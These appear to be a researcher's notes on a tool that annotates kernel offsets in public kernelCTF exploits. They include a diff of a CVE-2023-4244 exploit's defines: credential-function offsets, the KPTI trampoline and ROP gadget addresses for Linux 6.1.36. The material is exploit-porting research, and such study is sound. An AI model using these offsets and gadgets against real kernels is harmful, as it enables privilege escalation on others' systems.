Mix of addresses and offsets:
https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-4623_lts_cos/exploit/lts-6.1.36/exploit.c
For some reaosn this exploit fails with no space left on disk while spraying xattr, even though there should be space in tmpfs

https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-4244_lts/exploit/lts-6.1.36/exploit.c
This one runs on 6.1.36 succesfully

Issues:
--- /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2023-4244_lts/exploit/lts-6.1.36/exploit.c
+++ /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2023-4244_lts/exploit/lts-6.1.36/exploit.c
@@ -209,23 +209,23 @@
 #define PORT_SERVER 8888
 #define MSG_COUNT 1024
 
-#define NFT_NOTRACK_EVAL (0xe35bd0 + 0x1c820)
-#define DMI_CLASS 0x28c83a0
-#define KPTI_TRAMPOLINE 0x1201090 + 0x36 // swapgs_restore_regs_and_return_to_usermode + offset
-#define PREPARE_KERNEL_CRED 0x1befb0
-#define COMMIT_CREDS 0x1bed10
-#define FIND_TASK_BY_VPID 0x1b5600
-#define SWITCH_TASK_NAMESPACES 0x1bd180
-#define INIT_NSPROXY 0x26765c0
-#define KERNEL_BSS 0x35ffff0
-
-#define PUSH_RSI_JMP_PTR_RSI_66 0xc8303f     // push rsi ; jmp qword ptr [rsi + 0x66]
-#define POP_RSP_R15_RET 0x12cfbe             // pop rsp ; pop r15 ; ret
-#define MOV_RDI_RAX_MOV_PTR_RDX_RCX 0x6d014a // mov rdi, rax ; mov dword ptr [rdx], ecx ; mov rax, rdi ; jmp 0xffffffff82404b80
-#define POP_RDI_RET 0x12cfc0                 // pop rdi ; ret
-#define POP_RSI_RET 0x128ae9                 // pop rsi ; ret
-#define POP_RDX_RET 0x1d75c2                 // pop rdx ; ret
-#define ADD_RSP_70_RET 0x33fce8              // add rsp, 0x70 ; jmp 0xffffffff82404b80
+#define NFT_NOTRACK_EVAL (__kexploit_kernel_offset(0xe35bd0) + __kexploit_kernel_offset(0x1c820))
+#define DMI_CLASS __kexploit_kernel_offset(0x28c83a0)
+#define KPTI_TRAMPOLINE __kexploit_kernel_offset(0x1201090) + __kexploit_kernel_offset(0x36) // swapgs_restore_regs_and_return_to_usermode + offset
+#define PREPARE_KERNEL_CRED __kexploit_kernel_offset(0x1befb0)
+#define COMMIT_CREDS __kexploit_kernel_offset(0x1bed10)
+#define FIND_TASK_BY_VPID __kexploit_kernel_offset(0x1b5600)
+#define SWITCH_TASK_NAMESPACES __kexploit_kernel_offset(0x1bd180)
+#define INIT_NSPROXY __kexploit_kernel_offset(0x26765c0)
+#define KERNEL_BSS __kexploit_kernel_offset(0x35ffff0)
+
+#define PUSH_RSI_JMP_PTR_RSI_66 __kexploit_kernel_offset(0xc8303f)     // push rsi ; jmp qword ptr [rsi + 0x66]
+#define POP_RSP_R15_RET __kexploit_kernel_offset(0x12cfbe)             // pop rsp ; pop r15 ; ret
+#define MOV_RDI_RAX_MOV_PTR_RDX_RCX __kexploit_kernel_offset(0x6d014a) // mov rdi, rax ; mov dword ptr [rdx], ecx ; mov rax, rdi ; jmp 0xffffffff82404b80
+#define POP_RDI_RET __kexploit_kernel_offset(0x12cfc0)                 // pop rdi ; ret
+#define POP_RSI_RET __kexploit_kernel_offset(0x128ae9)                 // pop rsi ; ret
+#define POP_RDX_RET __kexploit_kernel_offset(0x1d75c2)                 // pop rdx ; ret
+#define ADD_RSP_70_RET __kexploit_kernel_offset(0x33fce8)              // add rsp, 0x70 ; jmp 0xffffffff82404b80
 
 struct list_head
 {

In the above diff, 0x36 should not be annotated

There should be a confirmation to apply changes

Handles cases where author writes an arithmatic expression instead of 1 constant to represent offset
